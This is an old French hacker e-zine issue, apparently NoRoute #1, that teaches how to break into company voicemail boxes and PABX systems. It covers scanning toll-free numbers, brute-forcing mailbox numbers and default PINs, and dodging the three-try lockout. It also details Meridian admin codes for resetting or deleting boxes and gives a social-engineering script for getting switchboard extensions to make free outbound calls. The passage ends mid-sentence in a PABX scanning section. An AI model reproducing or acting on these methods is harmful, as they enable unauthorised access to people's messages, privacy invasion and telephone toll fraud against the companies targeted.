<br>NoRoute #1 &brvbar; Hacking de VMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&brvbar; 4761&nbsp;&nbsp; &brvbar; CoD4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &brvbar;
NoRoute #1
<br>-------------------------------------------------------------------------------
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=|HACKING DE VMB|=-
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Methodes reconnues et fiables pouvant
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
etre realis&Uacute;es par n'importe quel
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
humain qui a un cerveau.
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=|DEFINITION|=-
<p>Une VMB c'est une boite vocale ou on peut vous laisser des messages
vous
<br>pouvez les ecouter c komme un repondeur mais si votre boite vocale
est
<br>accessible par un numero vert n'importe ki peut vous appeler sans payer
est
<br>vous pouvez ecouter vos messages sans payer voila..
<br>&nbsp;
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=[ 1. FUCK TELECOM ]=-
<p>Avant de parler de comment trouver une vmb il faut savoir a koi &thorn;a
ressemble.
<br>Je classe les vmb en 3 sortes les types '1,2' les types '1,#' puis
les meridian.
<br>Bon jusque la ca veut rien dire he bien regardez les types '1,2' veut
dire
<br>que une fois o menu de la VMB j'ai le choix entre la touche '1' pour
envoyer
<br>un message et '2' pour aller dans ma boite aux lettres (voici un numero
de
<br>type '1,2' le 0800 00 10 10).
<br>Pour les types '1,#' c'est le choix entre la touche '1' pour envoyer
un
<br>message et '#' pour aller dans la boite aux lettres. (voici un numero
de type
<br>'1,#' 0800 43 47 45).
<br>Puis pour les VMB meridian pour les reconnaitre il faut faire '81'
quand
<br>l'annonce passe pour aller au menu de la vmb (certaines messageries
meridian
<br>disent carrement "bienvenue dans la messagerie meridian") (voici un
numero
<br>de vmb meridian le 0800 153 153).
<br>Voila on a presque tous les types de VMB que j'ai rencontre (certaines
vmb
<br>sont differentes mais elles se ressemblent presque toutes)
<br>&nbsp;
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=[ 2 LET'S ROCK ]=-
<p>Bon passons aux choses dites serieuses: le hack d'une VMB se compose
de
<br>cette maniere:
<p>1: trouver un numero
<br>2: voir si c une voie enregistree qui decroche (c bon) ou si c une
gentille
<br>&nbsp;&nbsp; jeune fille qui nous "allo" (c poa bon)..
<br>3: tester si ce numero a une VMB ou un PBX
<br>4: si oui decouvrir la procedure pour acceder a la vmb
<br>5: decouvrir le type de VMB ('1,2' ou '1,#' ou meridian)
<br>6: HACKER la VMB
<br>7: ABUSER de la VMB ;)
<p>Allez on y va..
<br>&nbsp;
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=[ 2.1 TROUVER UN NUMERO ]=-
<p>Pour trouver un numero vert qui est susceptible d'avoir une VMB sans
scanner
<br>pendant des jours pour 3 ou 4 vmb il faut faire les numero avec methode
par
<br>exemple faites des numeros du genre 0800 XAB XAB ex: 0800 140 140 ou
0800 120
<br>120 il y'a les numero du genre 0800 AB XC XC ex: 0800 50 20 20 (vous
<br>incrementerez les numero XC de +1 ex: 0800 50 20 20 ,0800 50 21 21)
puis vous
<br>avez les numero du genre 0800 41 42 43 ou 0800 43 42 41 (qui s'incremente
ou
<br>se decremente) puis ceux du genre 0800 XA XC XB ex: 0800 30 31 35 ou
0800 40
<br>47 45 etc.... bref tous les numero qui sont faciles a memoriser OK
(pour
<br>ceux qui on poa le courage de faire &thorn;a a la main est bien ils
feraient mieux de
<br>faire autre chose ;) )
<br>&nbsp;
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=[ 2.2 TEST DU NUMERO (VMB OR NOT VMB) ]=-
<p>Tous d'abord le test du numero doit se faire la nuit (souvent les PBX
qui
<br>SONT souvent associes avec des vmb ne marchent que la nuit ). Bon votre
numero
<br>que vous avez fait sonne si &thorn;a dit "allo" c poa bon si &thorn;a
dit "bienvenue
<br>dans messagerie vocale machin " il y'a pas plus clair si &thorn;a dit
"vous etes
<br>bien chez machin notre service n'est poa ouvert" ou tous autres messages
de ce
<br>genre IL PEUT Y AVOIR UNE VMB.
<br>&nbsp;
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=[2.3 TESTER SI LE NUMERO EST UNE VMB OU UN PBX ]=-
<p>Bon pour le savoir appuyez sur les touches '#' ou '*' ou '0' ou '9'
ou
<br>'81' ou '0* ' si la femme se tait et vous dit "entrez votre numero
de boite
<br>vocale" ou tous se ki se rapproche c bon il y'a un VMB vous pouvez
parfois
<br>tomber sur une tonalite grave qui FAIT "Boooooooooooooooo" c un pbx
<br>(attention vous tous les pabx ne font poa "Boooooooooooooooo" ) aller
autre
<br>etape..
<br>&nbsp;
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -=[ 2.4
DECOUVRIR LA PROCEDURE POUR ACCEDER A LA VMB ]=-
<p>Bon refaites le numero reappuyez sur la ou les touches qui vous ont
permis de
<br>decouvrir que le numero a bien une VMB EX: 0800 43 47 45 ,# une fois
que
<br>vous etes arrive a la femme (ou le mec) qui vous dis les options possible
<br>vous pouvez passer a l'etape suivante.
<br>&nbsp;
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=[ 2.5 DECOUVRIR LE TYPE DE VMB ]=-
<p>Ecoutez bien la femme qui vous dit ses options si elle dit "pour envoyer
un
<br>messages appuyer sur '1' ..... pour aller dans votre boite vocale tapez
<br>'2'" (VMB DE TYPE '1,2' ) ex : le 0800 00 10 10 bon si elle dit "pour
<br>envoyer un message appuyer sur '1' pour aller dans votre boite vocale
<br>appuyer sur '#'" (VMB DE TYPE '1,#') ex : le 0800 43 47 45 bon pour
savoir
<br>si c un meridian c simple si vous avez accede au VMB en faisant 81
c un VMB
<br>meridian ou souvent &thorn;a vous le dit du genre "bienvenue dans le
messagerie
<br>meridian" ok ex: 0800 153 153
<br>&nbsp;
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=[ 2.6 HACKER LA VMB ]=-
<p>Tout d'abord on va parler de la procedure qui est valable pour les types
de
<br>VMB '1,2' et '1,# ' puis on attaquera le cas meridian.
<br>&nbsp;
<p>GO HACK D'une VMB de type '1,2'
<br>------------------------------
<br>Faites le numero de telephones puis dites a la vmb que vous voulez
aller
<br>dans votre boite vocale elle va vous demander votre numero de boite
vocale
<br>tapez un chiffre au hasard par exemple le '1' si &thorn;a ne dit rien
c que le
<br>numero 1 est valide puis tapez un autre chiffre ex: le 3 si &thorn;a
dis "numero
<br>incorect" c poa le '3' essayer un autre chiffre 4 par ex si &thorn;a
ne dit rien c
<br>que c bon exemple votre numero de boite vocale est en ce moment 14xx.
<br>x=chiffres a trouver continuer jusqu'a trouver une boite valide si
on vous
<br>demande poa votre code confidentielle c bon vous avez une VMB (non
ne
<br>partez pas de suite dans ce genre de VMB tres peu ont un numero de
code
<br>generalement se sont les phreakers qui en ont :)
<br>&nbsp;
<p>GO HACK D'UNE VMB DE type '1,#'
<br>-------------------------------
<br>Effectuer la meme procedure que pour les VMB DE TYPE '1,2' pour trouver
un
<br>numero de boite vocale et une fois que vous avez decouvert un numero
de
<br>boite vocale valide on va vous demander votre numero de code dans 99%
des
<br>cas le numero de code est le numero de la boite exemple : 44 55 code
44 55
<br>sinon essayez des numeros du type numero de la boite a l'envers des
numeros
<br>de code du genre 1111 ou 1234 bref vous voyez le truc (sinon faites
une
<br>cure rapide de malice ou allez voir France-Telecom pour voir si ils
ont du
<br>boulot )
<p>#############################[ L'Astuce du siecle! ]###########################
<br>Quand vous essayez de hacker une VMB vous etes generalement VIRES AU
BOUT DE
<br>3 MAUVAIS ESSAIS pour eviter de se faire virer ,au bout du 2eme essai
<br>appuyer sur # (ou * sur certaine vmb) pour revenir au menu principal
puis
<br>apuyez sur la touche # (pour les VMB de type '1.#' est '2' pour les
VMB de
<br>type '1.2') puis recommencez le hack ou vous l'avez laisse.
<br>###############################################################################
<br>&nbsp;
<p>GO HACK D'UNE VMB MERIDIAN
<br>--------------------------
<br>le BRONX je vous le dis
<br>je laisse EASY HACKER parler pour moi..
<br>(cette article est tire de NOWAY 2)
<p>IV) -=)> La VMB meridian &lt;(=-
<br>------------------------------
<p>&nbsp;&nbsp;&nbsp; * Acces direct a la VMB (par le numero du standard)
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Les commandes sont soit sur une
digit pour selectionner quelque chose dans le menu en cours, soit sur 2
pour acceder directement a une commande quelconque.
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Pendant le message d'accueil,
il suffit de taper 81 pour acceder a une
<br>BAL. Au risque de me repeter, les bals sont sur 4 digits. Par defaut,
le code
<br>est bien entendu le numero des BALs. Le plus dur au debut est de tomber
sur
<br>un numero de BAL existante. Scannez d'abord les bals de la forme x100,
puis
<br>augmentez de 5 en 5 (x105 x110 x115 etc...).
<br>Une fois que vous etes logges,
<br>vous arrivez a la lecture du courrier. Les commandes possibles sont:
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
2: lecture du message en cours
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
4: message precedent
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
5: ecrire un message
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
6: messave suivant
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
9: appelle le poste de l'expediteur
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Les autres commandes possibles
sont:
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
70: ajout de la mention "URGENT" sur un message
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
71: repond au message en cours
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
72: consulter l'envellope du message
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
73: transfert
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
74: ???
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
76: efface le message
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
77: supprime le message de tous les destinataires
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
78: envoi de message dans toutes les bals
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
79: envoi un message apres son enregistrement
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Et les commandes se rapportant
plus a votre boite qu'aux messages:
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
80: parametrage VMB
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
81: reconnexion
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
82: repondeurs (interne et externe)
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
83: deconnexion
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
84: change le mot de passe
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
85: listes de diffusion
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
86: acces direct a un message (faire numero du msg + #)
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
87: annuaire des bals
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
88: maintenance des bals
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
89: changement du nom du proprio
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Certaines commandes etant particulierement
interessantes, je vais en
<br>detailler quelques unes:
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
80: permet d'acceder a un menu tres interessant concernant le
<br>parametrage global de la VMB. Les differents choix proposes sont:
<p>&nbsp;&nbsp;&nbsp; 1: change le numero de l'operateur (lorsqu'on demande
de l'aide en tapant
<br>0 ou qu'on se fait jeter apres 3 essais de hack d'une bal). Les digits
<br>filtrees sont les memes que lorsqu'on est directos sur le PBX, par
consequent
<br>les indicatifs qui ne marchaient pas n'ont pas plus de chances de marcher
en
<br>passant par la. Par contre lorsque la fonction d'appel automatique
d'un poste
<br>est absente, celle-ci vient a la rescousse. Le numero doit la aussi
etre
<br>suivi de # et precede de l'indicatif d'outdial. REMETTEZ IMPERATIVEMENT
LE
<br>NUMER0 DE P0STE PRECEDENT (ca le dit lorsque vous essayez de le modifier)
<br>sinan le lendemain matin c'est D0WN !!! :*(
<p>&nbsp;&nbsp;&nbsp; 2: modification du message d'accueil (5 pour enregistrer,
# pour finir)
<p>&nbsp;&nbsp;&nbsp; 3: modification de l'arborescence. J'avoue ne pas
avoir capte grand chose
<br>a cette fonction (qui m'a pourtant l'air tres interessante), car elle
fait
<br>references a plein de nombres dont la signification est difficile a
trouver
<br>sans la doc. Mais j'ai beau avoir pratiquement tout explore, je n'ai
pas
<br>trouve quoi que ce soit permettant de modifier les indicatifs filtres
:-(
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
81: cette fonction est un bonheur pour pouvoir scanner des
<br>codes sans se faire deco. 0n est en effet deco au bout de 3 essais,
mais le
<br>compteur est remis a zero lorsqu'on se logge. Par consequent, il suffit
de
<br>faire deux essais, de se logger sous une bal dont on connait le code,
de
<br>refaire 81 et hop... le compteur est remis a zero et on peut refaire
2 essais
<br>avant de se relogger etc... 0n peut ainsi scanner autant de BAL que
desire
<br>sans jamais se faire deconnecter. ;-)
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
83: a quoi sert cette fonction ?
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
85: les listes de diffusions sont tres pratiques pour pouvoir
<br>scanner les numeros de bals utilises. Il suffit en effet d'entrer le
numero
<br>de la liste a creer suivi de #, de faire 5 et hop, la VMB attend les
numeros
<br>de BALs et vous dit au fur et a mesure si c'est attribue ou non. Attention
<br>toutefois: les frequences DTMF ne sont pas pris en compte lorsque le
message
<br>dit "Il n'y a pas de boite au numero". La signalisation ne reprend
qu'apres
<br>cette phrase, avant de prononcer le numero de la BAL en question. Donc
ne
<br>vous precipitez pas sinon ca va systematiquement vous dire que la BAL
entree
<br>n'existe pas a cause d'une erreur de frappe...
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Le plus simple pour hacker des
BALs est donc de scanner toutes les
<br>BALs existantes grace a cette fonction, de tout noter au fur et a mesure,
<br>puis de tester celles dont le passe est egal au poste grace a la commande
81.
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
87: cette fonction est parfois accessible de tous, mais
<br>generalement reservee a quelques BALs de niveau de securite superieur.
C'est
<br>assez lourd car ca vous donne pour chaque numero le nom du proprietaire,
la
<br>date de la derniere visite, le nombre de messages envoyes, recus, archives
et
<br>d'autres conneries, mais c'est quand meme une aubaine lorsque cette
option est
<br>disponible !
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
88: cette fonction n'est accessible que par la BAL du service
<br>informatique (souvent situe dans les 9000 et ne correspondant pas forcement
a
<br>un poste en service). Les choix proposes sont les suivants:
<p>&nbsp;&nbsp;&nbsp; 1: Informations sur une boite: derniere visite, nom
du proprio, etc...
<p>&nbsp;&nbsp;&nbsp; 2: Suppression d'une boite: attention: le numero
doit etre valide par deux
<br>appuis successifs sur la touche #.
<p>&nbsp;&nbsp;&nbsp; 3: Reinitialisation d'une boite: cette commande peut
s'effectuer sur une
<br>BAL en service ou non. Les messages et repondeurs sont effaces, et
le code est
<br>remis au numero de la BAL.
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Il n'est malheureusement impossible
de modifier le niveau d'une autre
<br>BAL ni le filtre des indicatifs a ce point-ci.
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
89: commande souvent retiree pour des raisons que je n'explique
<br>pas encore...
<br>&nbsp;
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=[ 2.7 ABUSER DE LA VMB ]=-
<p>Ben la je vous fais confiance :)
<br>&nbsp;
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=[ 3.0 PRECAUTIONS ]=-
<p>Ben voila&nbsp; une vmb c bien mais il faut faire attention de pas la
griller
<br>betement.
<br>1. Ne jamais prendre une vmb deja utilisee a moins que vous n'en vouliez
une
<br>&nbsp;&nbsp; d'urgence.
<br>2. Ne jamais foutre le bronx sur les VMB a moins de vengeance iminente
pensez
<br>&nbsp;&nbsp; aux autres.
<br>3. Ne jamais virer les messages des autres utilisateurs.
<br>4. Ne surchagez poa votre boite vocale avec une annonce de 30 minutes
et 8000
<br>&nbsp;&nbsp; messages.
<br>5. Amusez vous bien est soyez toujours des mecs cool.
<br>6. Ne denoncez jamais un autre phreaker.
<br>7. Vous risquez poa de vous faire tracer si vous avez poa une ligne
numeris.
<p>Bref les VMB c bien c facille c cool c pratique...
<br>Mais LES PABX C MIEUX alors au prochain numero.
<p>COD4 (une precision COD4 ne veut pas dire le quatrieme COD &thorn;a
veut COD4 c
<br>TOUT bon je m'en vais :)
<br>&nbsp;
<p>++++++++++++++++++++++++++++++nEW NEW NEW NEw++++++++++++++++++++++++++++++++++
<p>1: Comment se trouver facilement un BOITE VOCALE sur les VMB meridian
!!
<p>Vous avez le choix bien sur de scanner tous les numero de 5 en 5 mais
bon
<br>hum hum c long voici la meilleure fa&ccedil;on hehe...
<br>1.1 d'abords trouvez des boite meme utiliser pour cela
<br>lors du debut du messages faites le 0* la vous allez tombez sur un
message
<br>qui tient a peu pres ce language "vous etes en relation avec un service
qui
<br>vous mettra en relation avec la personne ou le poste que vous desirez
consulter
<br>entrez le numero de poste de la perssone que vous desirez consulter
suivi
<br>du #(diese)". Hum bon pour chercher un poste occupe tapez des numeros
<br>du genre 2100, 2300, 2400, etc vous voyez le genre bon une fois que
vous
<br>avez trouve une boite vocale notez la position ou elle se trouve.
<br>Vous savez maitenant que il y'a un groupe de boites vocales autours
d'elle
<br>maintenant determiner le debut et la fin du groupe occupe.
<br>ex: il y'a des boite vocales (de 2500 a 2550) vous avez donc un groupe
de 50
<br>boites vocales environ.
<br>Allez voici le truc si la derniere VMB est 2550 ajoutez 5 est vous
obtiendrez
<br>la VMB 2555 (logique non) bon maitenant racrochez rappellez lors du
message
<br>faites 81 la tapez le numero de boite 2555 puis comme passe 2555 (attention
&ccedil;a
<br>peut changer essayer le 0000 etc).
<br>Hehe et vous voila avec un jolie boite vocale...
<br>Et vous avez gagne du temps ;)
<p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<p>LES OUTDIALS FACILES sur meridian (hehe meridian a mal) pour caller
gratos
<br>depuis UN MERIDIAN voici les 2 methodes que j'utilise d'abors loggez
vous sur
<br>votre VMB OK une fois desus faite 0* la vous allez tomber sur le classique
<br>"vous etes en relation avec blablabla...." bon essayez votre numero
comme
<br>&ccedil;a indicatif+numero+# a la fin EX: 00+numero+# (essayez tous
les
<br>indicatifs bateau)ou si vous etes un vrai acharne faites tous le numero
de 0
<br>a 99 bon &ccedil;a marche poa arg passez a la methode 2 bon d'abord
faut le
<br>numero du standard oui je veux bien mais je le trouve comment ? la
faut
<br>ruser allez regardez comment j'ai recupere un bo numero de standard
<br># allo oui bonjour je voudrais connaitre votre numero
<br>+ comment ?
<br># oui en faite j'ai mis votre numero dans la memoire de mon telephone
est
<br>&nbsp; comme je voudrais le noter sur papier j'en aurais besoin!
<br>+ ha oui je comprends ben c le XXX+XXX+XXXX
<p>Bon un fois le numero entre les pognes prenez les 4 derniers chiffres
du
<br>numero qu'elle vous as donne EX. 12 34 '55 66' prenez le 55 66 en fait
le
<br>55 66 corespond au numero de poste du standard allez reconnectez vous
sur
<br>votre VMB faites 0* puis le 5566+numero+# voila c tout mais c deja
poa mal
<br>bon pour toute info je suis preneur ALLEZ BON HACK/PHREAK.
<br>&nbsp;
<p>CREDITS
<br>T7HS,PAceMAKer,BYpass,SORcErY,cleb,MayW33d,KWel,^mars ,loginz,
<br>Morgan,scud ,zeb,pegase,ZZZ , est tous ceux du #hackfr
<br>et larsen qui ma donne l'id&Uacute;e
<br>noway qui ma ouvert les yeux
<br>npc qui me les ouvre encore
<br>dsk qui est vraiment actif
<br>puis le phe
<br>PUIS LE PLUS NOBLE DE TOUS
<p>THE 7th HACKER'S SOCIETY
<br>;)
<br>&nbsp;
<br>&nbsp;
<br>&nbsp;
<p>L'article suivant est tir&eacute; de NoRoute #2 :
<br>&nbsp;
<br>&nbsp;
<p>&nbsp;&nbsp;&nbsp;&nbsp; PABX BACK AGAIN !
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
by
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
CoD4
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-----------------
<p>&nbsp;WARNING: VOUS DEVEZ AVOIR AU MOINS LU LE FILE SUR LES PABX (cod4pabx.txt)
<br>&nbsp;~~~~~~~&nbsp; QUI EST DANS NOROUTE #1.
<p>&nbsp;Hello! Nous revoila plus forts que jamais ! Ca y est vous avez
deja touche
<br>aux PABX et vous avez un peu mieux compris comment ca marche. Vous
avez
<br>surement une bonne centaine de VMB, et a la limite vous avez deja reussi
a
<br>faire un outdial ! Mais voila vous etes un peu sur votre faim ....
vous vous
<br>lassez ?
<p>&nbsp;Hey! Avez-vous vraiment tous explore le PABX ? Non ? Vous avez
alors loupe
<br>pas mal de trucs ! Bon vous allez ratrapper tout ca.
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=$[ 1: SCAN du PABX ! ]$=-
<p>&nbsp;Scanner un PABX ? Voui, le scan du PABX va surement vous faire
decouvrir
<br>des trucs assez sympas comme: ligne de telegestion, FAX, modem, outdial,
<br>etc... Bon,, je vais vous montrer comment on scanne un PABX depuis
<br>l'interieur. D'abord, vous devez connaitre au moins un numero de poste.
Pour
